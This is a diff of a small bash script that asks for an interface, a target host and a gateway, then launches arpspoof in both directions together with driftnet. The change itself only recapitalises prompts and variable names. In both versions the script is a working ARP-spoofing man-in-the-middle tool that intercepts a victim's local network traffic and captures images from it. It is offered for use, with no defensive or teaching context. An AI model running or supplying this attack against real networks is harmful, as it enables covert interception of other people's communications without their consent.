@@ -12,10 +12,10 @@ echo -e "\033[1;34;70m
 
 \033[0m"
  
-read -p "[+]Please enter interface name: " interface 
-read -p "[+]Please enter the target:  " target
-read -p "[+]Please enter the host to spoof as, usually gateway: " gateway
+read -p "[+]Please Enter Interface Name: " Interface 
+read -p "[+]Please Enter The Target:  " Target
+read -p "[+]Please Enter The Host To Spoof Usually Gateway: " Gateway
 
-echo -e "\n\n[+]Executing both commands\n\n"
-arpspoof -i $interface  -t  $target $gateway & arpspoof -i $interface -t $gateway $target & driftnet
+echo -e "\n\n[+]Executing Both Commands\n\n"
+arpspoof -i $Interface  -t  $Target $Gateway & arpspoof -i $Interface -t $Gateway $Target & driftnet
 
